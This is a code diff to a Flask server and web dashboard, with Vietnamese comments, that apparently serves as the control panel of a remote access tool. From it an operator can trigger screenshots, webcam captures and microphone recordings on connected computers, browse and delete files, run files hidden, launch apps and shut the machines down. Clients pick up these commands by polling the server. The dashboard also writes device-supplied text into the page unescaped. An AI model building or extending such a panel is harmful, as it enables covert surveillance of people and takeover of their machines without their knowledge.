@@ -7,10 +7,10 @@ all_devices_data = {}
 screenshot_requests = {}
 cam_requests = {}
 mic_requests = {}
-power_requests = {}      
-app_launch_requests = {} 
-file_requests = {}        
-latest_file_results = {}  
+power_requests = {}
+app_launch_requests = {}
+file_requests = {}
+latest_file_results = {}
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -32,7 +32,7 @@ HTML_TEMPLATE = """
         .status-badge { font-size: 0.8rem; padding: 4px 8px; border-radius: 20px; font-weight: bold; margin-left: 8px; }
         .badge-online { background-color: #d1e7dd; color: #0f5132; }
         .badge-offline { background-color: #f8d7da; color: #842029; }
-        
+
         .file-explorer-box { background: white; border: 1px solid #dee2e6; border-radius: 8px; padding: 15px; max-height: 400px; overflow-y: auto; }
         .file-item { display: flex; align-items: center; justify-content: space-between; padding: 6px 10px; border-bottom: 1px solid #f1f3f5; font-size: 0.9rem; border-radius: 4px; }
         .file-item:hover { background-color: #f8f9fa; }
@@ -85,7 +85,7 @@ HTML_TEMPLATE = """
 
                 data.items.forEach(item => {
                     let icon = item.is_dir ? "📁" : "📄";
-                    let actionButtons = item.is_dir ? 
+                    let actionButtons = item.is_dir ?
                         `<button class="btn btn-sm btn-light py-0 px-1 text-primary" onclick="explorePath('${pcName}', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')">Mở 📂</button>` :
                         `<button class="btn btn-sm btn-light py-0 px-1 text-success" onclick="executeFileAction('${pcName}', 'execute', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')">⚡ Chạy ẩn</button>
                          <button class="btn btn-sm btn-light py-0 px-1 text-danger" onclick="executeFileAction('${pcName}', 'delete', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')">🗑️ Xóa</button>`;
@@ -108,14 +108,19 @@ HTML_TEMPLATE = """
                 let response = await fetch('/view-status');
                 let devices = await response.json();
                 let container = document.getElementById('devices-container');
-                
+
                 if (Object.keys(devices).length === 0) {
                     container.innerHTML = '<div class="text-center text-muted py-5">Chưa có thiết bị nào kích hoạt...</div>';
                     return;
+                } else {
+                    // Nếu có thiết bị, xóa dòng chữ "Đang thiết lập kênh truyền..." ở lần đầu tiên đi
+                    let loadingDiv = container.querySelector('.text-muted.py-5');
+                    if (loadingDiv) loadingDiv.remove();
                 }
-                
+
                 let currentTime = Math.floor(Date.now() / 1000);
 
+                // Duyệt qua từng máy trong danh sách trả về từ Server
                 for (let name in devices) {
                     let info = devices[name];
                     let isOnline = (currentTime - info.timestamp) <= 30;
@@ -124,19 +129,21 @@ HTML_TEMPLATE = """
                     let ipsHtml = info.all_ips ? info.all_ips.map(ip => `<li>${ip}</li>`).join('') : '<li>No IP</li>';
                     let gpusHtml = info.gpus && info.gpus.length > 0 ? info.gpus.map(g => `<li><strong>${g.name}</strong>: ${g.memory_total}</li>`).join('') : '<li>Không phát hiện GPU rời</li>';
                     let disksHtml = info.disks ? info.disks.map(d => `<li>Ổ <code>${d.device}</code>: Đầy ${d.percentage} (Trống: ${d.free})</li>`).join('') : '';
-                    
+
                     let cpuAppsHtml = info.top_cpu_names ? info.top_cpu_names.map(a => `<li>${a}</li>`).join('') : '<li>Đang tính...</li>';
                     let ramAppsHtml = info.top_ram_names ? info.top_ram_names.map(a => `<li>${a}</li>`).join('') : '<li>Đang tính...</li>';
 
                     let appOptionsHtml = info.installed_apps_list ? info.installed_apps_list.map(app => `<option value="${app}">${app}</option>`).join('') : '<option value="Radmin VPN">Radmin VPN</option>';
                     let screenshotHtml = info.screenshot ? `<img src="${info.screenshot}" class="screenshot-img" alt="Screen">` : '<p class="text-muted small italic">Chưa có ảnh màn hình...</p>';
-                    
+
                     let camResultHtml = info.cam_result ? (info.cam_result.startsWith("ERROR:") ? `<div class="alert alert-danger p-2 small mt-2">${info.cam_result}</div>` : `<img src="${info.cam_result}" class="screenshot-img" alt="Cam">`) : '<p class="text-muted small italic">Đang đợi lệnh chụp...</p>';
                     let micResultHtml = info.mic_result ? (info.mic_result.startsWith("ERROR:") ? `<div class="alert alert-danger p-2 small mt-2">${info.mic_result}</div>` : `<audio controls class="w-100 mt-2"><source src="${info.mic_result}" type="audio/wav"></audio>`) : '<p class="text-muted small italic">Chưa có tệp ghi âm...</p>';
-                    
+
                     let appExecuteLog = info.app_execute_result ? `<div class="alert alert-info p-2 small mt-2 font-monospace">${info.app_execute_result}</div>` : '<p class="text-muted small italic mb-0">Chưa có bản ghi thực thi.</p>';
 
                     let cardElem = document.getElementById('card-' + name);
+
+                    // NẾU MÁY CHƯA CÓ TRÊN GIAO DIỆN -> TẠO MỚI NGAY
                     if (!cardElem) {
                         let htmlContent = `
                         <div class="pc-card" id="card-${name}">
@@ -151,7 +158,7 @@ HTML_TEMPLATE = """
                                     <button class="btn btn-sm btn-outline-primary" data-bs-toggle="collapse" data-bs-target="#collapse-${name}">Bảng điều khiển</button>
                                 </div>
                             </div>
-                            
+
                             <div id="collapse-${name}" class="collapse">
                                 <div class="detail-body">
                                     <div class="row">
@@ -190,7 +197,7 @@ HTML_TEMPLATE = """
                                                 <button class="btn btn-danger btn-sm flex-fill" onclick="sendPowerCommand('${name}', 'shutdown')">🛑 Tắt Máy</button>
                                             </div>
                                         </div>
-                                        
+
                                         <div class="col-md-6">
                                             <h5 class="info-title">⚙️ Trạng Thái Hệ Thống</h5>
                                             <ul>
@@ -212,7 +219,7 @@ HTML_TEMPLATE = """
                                                     </div>
                                                 </div>
                                             </div>
-                                            
+
                                             <h5 class="info-title">🌐 Địa Chỉ IP Đang Chạy</h5><ul id="ips-${name}">${ipsHtml}</ul>
                                             <h5 class="info-title">🎮 Card Đồ Họa</h5><ul id="gpus-${name}">${gpusHtml}</ul>
                                             <h5 class="info-title">💾 Ổ Đĩa</h5><ul id="disks-${name}">${disksHtml}</ul>
@@ -220,15 +227,15 @@ HTML_TEMPLATE = """
                                             <h5 class="info-title">📸 Chụp Màn Hình Từ Xa</h5>
                                             <button class="btn btn-primary btn-sm w-100 mb-2" onclick="requestScreenshot('${name}')">Gửi lệnh chụp màn hình</button>
                                             <div class="text-center mb-3" id="screenshot-box-${name}">${screenshotHtml}</div>
-                                            
+
                                             <h5 class="info-title">📷 Lựa Chọn & Điều Khiển Camera</h5>
                                             <div class="input-group mb-2">
                                                 <select class="form-select form-select-sm" id="cam-select-${name}">${info.cameras ? info.cameras.map(c => `<option value="${c.index}">${c.name}</option>`).join('') : '<option value="0">Camera Mặc định</option>'}</select>
-                                                <button class="btn btn-success btn-sm" onclick="requestCamera('${name}')">Chụp từ Cam này</button>
+                                                <button class="btn btn-success" onclick="requestCamera('${name}')">Chụp từ Cam này</button>
                                             </div>
                                             <div class="text-center mb-3" id="cam-box-${name}">${camResultHtml}</div>
 
-                                            <h5 class="info-title">🎙️ Ghi Âm Từ Xa (Quét Động Mọi Mic Trên Máy)</h5>
+                                            <h5 class="info-title">🎙️ Ghi Âm Từ Xa</h5>
                                             <div class="input-group mb-2">
                                                 <select class="form-select form-select-sm" id="mic-select-${name}">${info.microphones ? info.microphones.map(m => `<option value="${m.index}">${m.name}</option>`).join('') : '<option value="0">Microphone Mặc Định</option>'}</select>
                                                 <button class="btn btn-warning btn-sm" onclick="requestMicrophone('${name}')">Thu âm Mic 5s</button>
@@ -241,20 +248,21 @@ HTML_TEMPLATE = """
                         </div>`;
                         container.insertAdjacentHTML('beforeend', htmlContent);
                     } else {
+                        // NẾU MÁY ĐÃ CÓ RỒI -> CHỈ CẬP NHẬT REAL-TIME ĐỂ TRÁNH GIẬT LÁC
                         document.getElementById(`badge-status-${name}`).innerHTML = statusBadge;
                         document.getElementById(`uptime-${name}`).innerText = info.uptime || "Đang tính...";
                         document.getElementById(`tasks-${name}`).innerText = info.total_tasks || 0;
                         document.getElementById(`cpu-usage-${name}`).innerText = info.cpu?.current_usage || "0%";
                         document.getElementById(`ram-usage-${name}`).innerText = info.ram?.percentage || "0%";
                         document.getElementById(`ram-detail-${name}`).innerText = `(Dùng: ${info.ram?.used} / ${info.ram?.total})`;
-                        
+
                         document.getElementById(`app-cpu-${name}`).innerHTML = cpuAppsHtml;
                         document.getElementById(`app-ram-${name}`).innerHTML = ramAppsHtml;
-                        
+
                         document.getElementById(`screenshot-box-${name}`).innerHTML = screenshotHtml;
                         document.getElementById(`cam-box-${name}`).innerHTML = camResultHtml;
                         document.getElementById(`app-log-box-${name}`).innerHTML = appExecuteLog;
-                        
+
                         document.getElementById(`ips-${name}`).innerHTML = ipsHtml;
                         document.getElementById(`gpus-${name}`).innerHTML = gpusHtml;
                         document.getElementById(`disks-${name}`).innerHTML = disksHtml;
@@ -266,17 +274,22 @@ HTML_TEMPLATE = """
                             micBox.innerHTML = micResultHtml;
                         }
 
-                        renderFileExplorerUI(name);
+                        // CHỈ QUÉT FILE KHI NGƯỜI DÙNG ĐANG MỞ TAB ĐIỀU KHIỂN CỦA MÁY ĐÓ (Tránh nghẽn luồng máy khác)
+                        let collapseBox = document.getElementById('collapse-' + name);
+                        if (collapseBox && collapseBox.classList.contains('show')) {
+                            renderFileExplorerUI(name);
+                        }
                     }
                 }
 
+                // Kiểm tra xóa card nếu máy bị tắt hoặc xóa khỏi DB ảo
                 let existingCards = container.querySelectorAll('.pc-card');
                 existingCards.forEach(card => {
                     let cName = card.id.replace('card-', '');
                     if (!devices[cName]) card.remove();
                 });
 
-            } catch (error) { console.error("Lỗi API:", error); }
+            } catch (error) { console.error("Lỗi API mạng hệ thống:", error); }
         }
 
         async function sendPowerCommand(pcName, type) {
@@ -296,7 +309,7 @@ HTML_TEMPLATE = """
         }
 
         async function requestScreenshot(pcName) { await fetch('/request-screenshot/' + pcName, { method: 'POST' }); }
-        
+
         async function requestCamera(pcName) {
             let selectedCam = document.getElementById('cam-select-' + pcName).value;
             await fetch('/request-camera/' + pcName + '/' + selectedCam, { method: 'POST' });
@@ -330,51 +343,45 @@ def home():
 def update_status():
     global all_devices_data, screenshot_requests, cam_requests, mic_requests, power_requests, app_launch_requests, file_requests, latest_file_results
     data = request.json
-    if data and "computer_name" in data:
-        computer_name = data["computer_name"]
-        device_info = data.copy()
-        device_info["timestamp"] = int(time.time())
-        
-        if "file_manager_data" in data:
-            latest_file_results[computer_name] = data["file_manager_data"]
-        
-        for field in ["screenshot", "cam_result", "mic_result", "app_execute_result"]:
-            if field in data:
-                device_info[field] = data[field]
-            elif computer_name in all_devices_data and field in all_devices_data[computer_name]:
-                device_info[field] = all_devices_data[computer_name][field]
-            else:
-                device_info[field] = None
-            
-        all_devices_data[computer_name] = device_info
-        
-        trigger_ss = screenshot_requests.get(computer_name, False)
-        if trigger_ss: screenshot_requests[computer_name] = False
-        
-        trigger_cam = cam_requests.get(computer_name, None)
-        if trigger_cam is not None: del cam_requests[computer_name]
-        
-        trigger_mic = mic_requests.get(computer_name, None)
-        if trigger_mic is not None: del mic_requests[computer_name]
-            
-        trigger_power = power_requests.get(computer_name, None)
-        if trigger_power is not None: del power_requests[computer_name]
-            
-        trigger_app = app_launch_requests.get(computer_name, None)
-        if trigger_app is not None: del app_launch_requests[computer_name]
-            
-        trigger_file = file_requests.get(computer_name, None)
-        if trigger_file is not None: del file_requests[computer_name]
 
-        return jsonify({
-            "status": "success", 
-            "trigger_screenshot": trigger_ss,
-            "trigger_cam_index": trigger_cam,
-            "trigger_mic_index": trigger_mic,
-            "trigger_power_command": trigger_power,
-            "trigger_launch_app": trigger_app,
-            "trigger_file_command": trigger_file
-        }), 200
+    if not data or "computer_name" not in data:
+        return jsonify({"status": "error", "message": "Missing computer_name"}), 400
+
+    computer_name = str(data["computer_name"]).strip()
+
+    # Khởi tạo vùng nhớ riêng biệt hoàn toàn cho máy này nếu là máy mới kết nối lần đầu
+    if computer_name not in all_devices_data:
+        all_devices_data[computer_name] = {}
+
+    # Tạo bản sao dữ liệu mới tinh để xử lý, tránh xung đột vùng nhớ chéo giữa các máy
+    device_info = dict(data)
+    device_info["timestamp"] = int(time.time())
+
+    if "file_manager_data" in data:
+        latest_file_results[computer_name] = data["file_manager_data"]
+
+    # Kế thừa dữ liệu cũ một cách an toàn cho đúng máy đó
+    for field in ["screenshot", "cam_result", "mic_result", "app_execute_result"]:
+        if field in data and data[field] is not None:
+            device_info[field] = data[field]
+        elif field in all_devices_data[computer_name]:
+            device_info[field] = all_devices_data[computer_name][field]
+        else:
+            device_info[field] = None
+
+    # Lưu chính xác vào danh mục của máy đó
+    all_devices_data[computer_name] = device_info
+
+    # Trả lệnh điều khiển chuẩn xác theo tên máy
+    return jsonify({
+        "status": "success",
+        "trigger_screenshot": screenshot_requests.pop(computer_name, False),
+        "trigger_cam_index": cam_requests.pop(computer_name, None),
+        "trigger_mic_index": mic_requests.pop(computer_name, None),
+        "trigger_power_command": power_requests.pop(computer_name, None),
+        "trigger_launch_app": app_launch_requests.pop(computer_name, None),
+        "trigger_file_command": file_requests.pop(computer_name, None)
+    }), 200
     return jsonify({"status": "error"}), 400
 
 @app.route('/request-file-action/<pc_name>', methods=['POST'])
